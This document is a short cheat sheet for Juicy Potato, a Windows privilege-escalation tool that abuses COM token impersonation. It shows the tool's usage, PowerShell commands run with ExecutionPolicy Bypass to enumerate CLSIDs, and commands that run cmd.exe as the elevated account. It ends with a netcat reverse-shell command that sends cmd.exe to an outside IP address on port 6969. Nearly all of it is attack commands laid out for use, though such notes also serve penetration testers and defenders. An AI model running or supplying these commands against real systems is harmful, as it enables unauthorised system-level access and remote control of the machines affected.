# Juicy Potato (abusing the golden privileges)

## usage

```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z only test CLSID and print token's user
```

## Checking CLSIDs
### run first
```
powershell.exe -ExecutionPolicy Bypass -File "C:\Temp\Join-Object.ps1"
```
does not provide direct output. Make sure there are no errors.

### get list CLSIDs
```
powershell.exe -ExecutionPolicy Bypass -File "C:\Temp\GetCLSID.ps1"
```
Verify following files are generated:<br>
CLSIDs.csv: List of CLSIDs and APIDs in CSV format.<br>
CLSID.list: List of CLSIDs only.


### checking CLSIDs
```
.\get.bat
```
result will saved on kaz.log

### or

### Check working CLSID using -c parameter
```
method 1
.\jus.exe -c "{list-xxx-from-xxx-kaz.log}" -t * -l 1337 -z

method 2
.\jus.exe -c "{list-xxx-from-xxx-kaz.log}" -p "c:\windows\system32\cmd.exe" -a "/c whoami" -l 1337 -t *
```

### Reverse Shell
```
.\jus.exe -l 1337 -c "{working-xxx-xxx-xxx-CLSID}" -p c:\windows\system32\cmd.exe -a "/c C:\Temp\nc.exe -t -e C:\Windows\System32\cmd.exe 123.123.123 6969" -t *
```


## reference

[hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato)<br>
[ohpe](https://github.com/ohpe/juicy-potato/blob/master/README.md)































